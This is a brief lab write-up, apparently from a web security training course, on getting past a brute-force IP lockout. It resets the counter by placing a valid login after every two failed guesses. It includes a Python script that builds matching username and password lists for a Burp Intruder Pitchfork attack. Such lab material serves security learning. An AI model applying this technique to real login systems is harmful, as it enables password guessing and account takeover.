## Authentication Test Cases
### Broken brute-force protection, IP block
What do we have?
* A valid set of credentials
* A password list
* Username which we want to bruteforce
Send the login request to repeater.
After 3 attempts, it says please try after 1 minute. This is soft lockout.
Now, 2 incorrect attempt, 1 correct attempt. This would be our approach.
We will write python script to use it with Pitchfork attack option.
```python
print("Username list is:")
for i in range(200):
    if i % 3:
        print("carlos")
    else:
        print("wiener")
print("Password List is:")
with open('passwords.txt', 'r') as f:
    lines = f.readlines()

i = 0
for pwd in lines:
    if i % 3:
        print(pwd.strip('\n'))
    else:
        print("peter")
        print(pwd.strip('\n'))
        i = i+1
    i = i +1
```
Here 200 in first lines is the approximation of the requests(Password List + 1 valid attempt after 2 invalid) that we want to send.
Use both the list with Pitchfork attack by having maximum concurrent requests set to 1.
